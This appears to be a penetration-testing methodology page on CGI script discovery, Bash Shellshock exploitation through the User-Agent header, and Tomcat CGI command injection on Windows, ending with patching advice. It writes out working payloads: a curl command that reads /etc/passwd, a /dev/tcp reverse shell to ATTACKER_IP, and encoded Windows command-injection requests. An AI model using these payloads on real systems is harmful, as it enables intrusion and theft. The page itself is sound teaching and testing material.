---
layout: page
title: "CGI, Shellshock and Tomcat CGI"
subtitle: "Finding CGI scripts, testing Bash Shellshock through request headers, and exploiting the Tomcat CGI argument handling"
permalink: /methodology/common-apps/cgi-shellshock/
---

Common Gateway Interface scripts let a web server run external programs to produce dynamic responses. They are usually found in a `cgi-bin` directory, and each request starts a new process. That process can be vulnerable in two distinct ways covered here: Bash Shellshock, which is triggered through environment variables set from request headers, and command-line argument injection in the Tomcat CGI servlet on Windows. Both are older issues, but they still appear on legacy systems and embedded devices.

## Finding CGI scripts

Brute-force the script directory with a wordlist and the relevant extensions:

```bash
gobuster dir -u http://TARGET_IP/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
```

A script that returns an empty body may still be reachable and worth testing. Check the status code and the headers, not just the body.

## Shellshock

Shellshock (CVE-2014-6271) affects GNU Bash up to version 4.3. Vulnerable versions execute commands placed after a function definition stored in an environment variable. The test is a harmless marker:

```bash
env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
```

A vulnerable shell prints `vulnerable-shellshock` before the normal output. A patched shell prints only `not vulnerable`.

CGI scripts pass request headers through environment variables, so the `User-Agent` header is a common injection point. Test with a harmless command first:

```bash
curl -H 'User-Agent: () { :; }; echo; echo; /bin/cat /etc/passwd' http://TARGET_IP/cgi-bin/access.cgi
```

If the response contains the file contents, the script runs the injected command as the web server user. Confirm the user with `id` through the same header, then decide whether a shell is in scope:

```bash
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1' http://TARGET_IP/cgi-bin/access.cgi
```

Listen on the attacker host first with `nc -lvnp ATTACKER_PORT`. The notes show a shell as `www-data`.

## Tomcat CGI (CVE-2019-0232)

The Tomcat CGI servlet can pass query-string values to a CGI program as command-line arguments when `enableCmdLineArguments` is set. On Windows, the servlet fails to validate those arguments, so a batch file can receive `&` commands. The notes list affected versions as 9.0.0.M1 to 9.0.17, 8.5.0 to 8.5.39, and 7.0.0 to 7.0.93.

### Enumeration

A full port scan with default scripts identifies Tomcat on TCP 8080 and AJP on 8009. Then fuzz for the CGI directory and batch files:

```bash
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://TARGET_IP:8080/cgi/FUZZ.bat
```

### Exploitation

1. Confirm the injection with the batch separator and a directory listing:

```http
GET /cgi/welcome.bat?&dir HTTP/1.1
```

2. If commands such as `whoami` fail, list the environment. In the notes, `PATH` was unset, so the command must use a full path:

```http
GET /cgi/welcome.bat?&set HTTP/1.1
```

3. Request the executable by its full path. The notes encountered a filter that rejected the backslash, and URL encoding the path got past it:

```http
GET /cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe HTTP/1.1
```

## What to look for

- CGI scripts that respond to unusual header values.
- Bash versions up to 4.3 on Linux appliances and older web servers.
- Tomcat versions within the affected ranges, with CGI enabled and command-line arguments allowed.
- The account the script runs under. Shellshock gives the web server user, and Tomcat gives the service account.

## Pitfalls

- A patched system may still print the body of the response, so check the marker output, not only the content.
- Filters may reject special characters. URL encoding is a common fix, but confirm the result rather than assuming it worked.

## Defense and prevention

Patch Bash and remove unused CGI scripts. Disable `enableCmdLineArguments` in the Tomcat CGI servlet unless it is required, and keep Tomcat on a supported release. Restrict the `cgi-bin` directory to the scripts that are needed, and do not pass request data to shells. See the [Tomcat](/methodology/common-apps/tomcat/) page and the [application hardening](/methodology/common-apps/prevention/) page.
